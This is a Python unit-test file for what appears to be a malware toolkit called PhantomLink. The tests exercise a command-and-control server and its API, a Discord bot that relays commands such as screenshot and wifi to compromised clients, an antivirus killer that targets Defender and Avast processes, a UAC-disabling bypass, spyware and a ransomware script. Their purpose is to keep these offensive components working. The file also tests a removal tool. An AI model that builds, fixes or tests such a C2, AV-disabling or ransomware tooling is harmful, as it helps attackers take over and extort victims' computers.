import io
import json
import os
import sys
import unittest
import urllib.error
from pathlib import Path
from unittest.mock import MagicMock, patch

# Ensure repo root is in sys.path
_REPO_ROOT = Path(__file__).resolve().parents[1]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))


class C2FrameworkTests(unittest.TestCase):
    """Deep unit and integration tests for C2 Server components."""

    def test_client_manager_lifecycle(self):
        from C2.C2 import ClientManager

        manager = ClientManager()
        manager._recv_message = MagicMock(side_effect=[b"PhantomLink", b"TestUser"])
        mock_conn = MagicMock()

        # Add client
        cid = manager.add_client(mock_conn, ("127.0.0.1", 12345))
        self.assertIn(cid, manager.clients)

        # Get client
        client = manager.get_client(cid)
        self.assertIsNotNone(client)
        self.assertEqual(client["username"], "TestUser")
        self.assertTrue(client["active"])

        # Update last seen
        initial_seen = client["last_seen"]
        manager.update_last_seen(cid)
        self.assertGreaterEqual(client["last_seen"], initial_seen)

        # Keepalive failures
        self.assertEqual(manager.increment_keepalive_failure(cid), 1)
        self.assertEqual(manager.increment_keepalive_failure(cid), 2)

        # Remove client
        manager.remove_client(cid)
        self.assertNotIn(cid, manager.clients)

    def test_c2_message_framing_length_limit(self):
        from C2.C2 import ClientManager

        manager = ClientManager()
        mock_conn = MagicMock()

        # Test sending string and bytes
        self.assertTrue(manager._send_message(mock_conn, "PING"))
        self.assertTrue(manager._send_message(mock_conn, b"PONG"))

        # Test oversize message (>10MB) rejected on receive
        import struct

        # Pack length > 10MB (11MB)
        mock_conn.recv.side_effect = [struct.pack("!I", 11 * 1024 * 1024)]
        res = manager._recv_message(mock_conn)
        self.assertIsNone(res)

    def test_c2_api_status_endpoint(self):
        from C2.C2 import C2APIHandler

        handler = C2APIHandler.__new__(C2APIHandler)
        handler.path = "/api/status"
        handler.headers = {}
        handler._check_auth = MagicMock(return_value=True)
        handler._set_headers = MagicMock()
        handler.wfile = io.BytesIO()

        handler.do_GET()
        raw = handler.wfile.getvalue().decode()
        output = json.loads(raw)
        self.assertEqual(output.get("status"), "ok")


class DiscordBotTests(unittest.TestCase):
    """Deep unit and edge case tests for Discord Bot module."""

    def test_discord_simple_commands_exist(self):
        import discord_bot

        self.assertIn("screenshot", discord_bot.SIMPLE_COMMANDS)
        self.assertIn("sys", discord_bot.SIMPLE_COMMANDS)
        self.assertIn("wifi", discord_bot.SIMPLE_COMMANDS)

    def test_discord_param_commands_builder(self):
        import discord_bot

        alert_builder = discord_bot.PARAM_COMMANDS["alert"]["build"]
        cmds = alert_builder("Test Alert Message")
        self.assertEqual(len(cmds), 1)
        self.assertIn("Test Alert Message", cmds[0])

    def test_c2_server_offline_handling(self):
        import discord_bot

        with patch("urllib.request.urlopen", side_effect=urllib.error.URLError("Connection Refused")):
            result = discord_bot._send_commands_sync(["dir"])
            self.assertIn("C2 Server ไม่ได้เปิดอยู่", result)

    def test_c2_server_response_formatting(self):
        import discord_bot

        mock_response = MagicMock()
        mock_response.read.return_value = json.dumps({
            "results": [
                {"client_id": 1, "username": "AdminPC", "status": "success", "output": "Directory listing..."}
            ]
        }).encode("utf-8")
        cm = MagicMock()
        cm.__enter__.return_value = mock_response

        with patch("discord_bot._check_c2_server", return_value=True):
            with patch("urllib.request.urlopen", return_value=cm):
                result = discord_bot._send_commands_sync(["dir"])
                self.assertIn("[Client 1 (AdminPC)] Status: success", result)
                self.assertIn("Directory listing...", result)


class AntiPhantomSuiteTests(unittest.TestCase):
    """Tests for Anti-Phantom malware removal components."""

    def test_remover_initialization(self):
        from anti_phantom.remover import PhantomLinkRemover

        remover = PhantomLinkRemover()
        self.assertTrue(len(remover.suspicious_names) > 0)
        self.assertTrue(len(remover.suspicious_paths) > 0)

    def test_hosts_file_cleaning(self):
        from anti_phantom.remover import PhantomLinkRemover

        remover = PhantomLinkRemover()
        with patch("os.path.exists", return_value=True):
            with patch("builtins.open", unittest.mock.mock_open(read_data="127.0.0.1 localhost\n")):
                remover.clean_hosts_file()
                self.assertIn("Hosts file is clean", remover.removed_items)


class ClientAndToolsTests(unittest.TestCase):
    """Tests for Client utilities, AV bypass, and Spyware modules."""

    def test_av_killer_process_list(self):
        from client.av_killer import AV_PROCESSES, AVKiller

        killer = AVKiller()
        self.assertIn("MsMpEng.exe", AV_PROCESSES)
        self.assertIn("AvastUI.exe", AV_PROCESSES)
        self.assertFalse(killer.running)

    def test_hackchat_text_arabic_helpers(self):
        from HackChat.text import fix_arabic, is_arabic

        self.assertFalse(is_arabic("English test"))
        self.assertEqual(fix_arabic("ASCII"), "ASCII")

    def test_av_bypass_disable_uac_uses_valid_subprocess_kwargs(self):
        """Verify disable_uac uses subprocess.run with capture_output instead of subprocess.call"""
        import inspect
        from client.av_bypass import AVBypass
        
        source = inspect.getsource(AVBypass.disable_uac)
        self.assertNotIn("subprocess.call", source)
        self.assertIn("subprocess.run", source)
        self.assertIn("capture_output=True", source)

    def test_screenshoter_no_infinite_recursion(self):
        """Verify send_screenshot in screenshoter.py does not contain an infinite recursive loop"""
        content = (_REPO_ROOT / "more-tools" / "Spyware" / "screenshoter.py").read_text(encoding="utf-8")
        
        in_fn = False
        fn_lines = []
        for line in content.splitlines():
            if line.startswith("def send_screenshot"):
                in_fn = True
                fn_lines.append(line)
            elif in_fn:
                if line and not line.startswith(" ") and not line.startswith("\t"):
                    break
                fn_lines.append(line)
        
        fn_body = "\n".join(fn_lines[1:])
        self.assertNotIn("while True:", fn_body)
        self.assertNotIn("send_screenshot()", fn_body)

    def test_its_your_ransom_imports(self):
        """Verify its_your_ransom adds its directory to sys.path before importing variables"""
        content = (_REPO_ROOT / "more-tools" / "Ransomeware" / "its_your_ransom.py").read_text(encoding="utf-8")
        
        sys_path_idx = content.find("sys.path")
        vars_import_idx = content.find("from variables import")
        
        self.assertNotEqual(sys_path_idx, -1, "its_your_ransom.py should configure sys.path")
        self.assertLess(sys_path_idx, vars_import_idx, "sys.path should be updated before importing variables")

    def test_c2_api_invalid_content_length_handling(self):
        """Verify C2APIHandler handles invalid Content-Length headers safely without crashing"""
        from C2.C2 import C2APIHandler
        
        handler = C2APIHandler.__new__(C2APIHandler)
        handler.path = "/api/command"
        handler.headers = {"Content-Length": "invalid_number"}
        handler._check_auth = MagicMock(return_value=True)
        handler._set_headers = MagicMock()
        handler.wfile = io.BytesIO()
        
        handler.do_POST()
        handler._set_headers.assert_called_with(400)
        output = json.loads(handler.wfile.getvalue().decode())
        self.assertIn("error", output)
        self.assertIn("Invalid Content-Length", output["error"])

    def test_discord_bot_urlopen_timeout(self):
        """Verify urllib.request.urlopen calls in discord_bot.py specify explicit timeouts"""
        content = (_REPO_ROOT / "discord_bot.py").read_text(encoding="utf-8")
        self.assertIn("urlopen(req, timeout=10)", content)
        self.assertNotIn("urlopen(req)\n", content)


if __name__ == "__main__":
    unittest.main()


